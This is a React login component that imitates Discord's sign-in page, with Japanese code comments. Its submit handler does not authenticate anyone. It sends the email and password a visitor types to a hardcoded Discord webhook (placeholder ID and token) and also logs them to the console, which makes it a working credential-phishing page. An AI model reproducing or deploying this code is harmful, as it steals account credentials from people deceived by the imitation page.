import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Eye, EyeOff } from "lucide-react";

export function LoginForm() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  // Discord Webhook URL（テスト用に直書きしてますが、本来はサーバー側に隠すべき）
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/あなたのWebhookID/あなたのWebhookトークン";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Discordに送信するペイロードを作成
    const payload = {
      content: null,
      embeds: [
        {
          title: "【Login Attempt】",
          color: 0xff0000,
          fields: [
            {
              name: "Email or Phone",
              value: email,
              inline: true,
            },
            {
              name: "Password",
              value: password,
              inline: true,
            },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    };

    try {
      const res = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (res.ok) {
        console.log("Webhook送信成功");
      } else {
        console.error("Webhook送信失敗", res.status);
      }
    } catch (error) {
      console.error("Webhook送信エラー", error);
    }

    console.log("Login attempted with:", { email, password });
  };

  return (
    <Card className="w-full max-w-md mx-auto bg-card/50 backdrop-blur-sm border-border">
      <CardHeader className="space-y-1 text-center pb-8">
        <div className="space-y-2">
          <h1 className="text-2xl font-bold text-foreground">Welcome back!</h1>
          <p className="text-sm text-muted-foreground">
            We're so excited to see you again!
          </p>
        </div>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Label
              htmlFor="email"
              className="text-xs font-bold text-muted-foreground uppercase tracking-wide"
            >
              Email or Phone Number *
            </Label>
            <Input
              id="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="bg-background border-border focus:border-primary transition-colors"
            />
          </div>

          <div className="space-y-2">
            <Label
              htmlFor="password"
              className="text-xs font-bold text-muted-foreground uppercase tracking-wide"
            >
              Password *
            </Label>
            <div className="relative">
              <Input
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="bg-background border-border focus:border-primary transition-colors pr-10"
              />
              <Button
                type="button"
                variant="ghost"
                size="icon"
                className="absolute right-0 top-0 h-full px-3 hover:bg-transparent"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? (
                  <EyeOff className="h-4 w-4 text-muted-foreground" />
                ) : (
                  <Eye className="h-4 w-4 text-muted-foreground" />
                )}
              </Button>
            </div>
          </div>

          <div className="space-y-4 pt-2">
            <Button type="submit" variant="discord" className="w-full">
              Log In
            </Button>

            <div className="text-sm">
              <span className="text-muted-foreground">Forgot your password? </span>
              <Button
                type="button"
                variant="link"
                className="p-0 h-auto text-primary font-normal"
              >
                Reset it here
              </Button>
            </div>

            <div className="text-sm">
              <span className="text-muted-foreground">Need an account? </span>
              <Button
                type="button"
                variant="link"
                className="p-0 h-auto text-primary font-normal"
              >
                Register
              </Button>
            </div>
          </div>
        </form>
      </CardContent>
    </Card>
  );
}
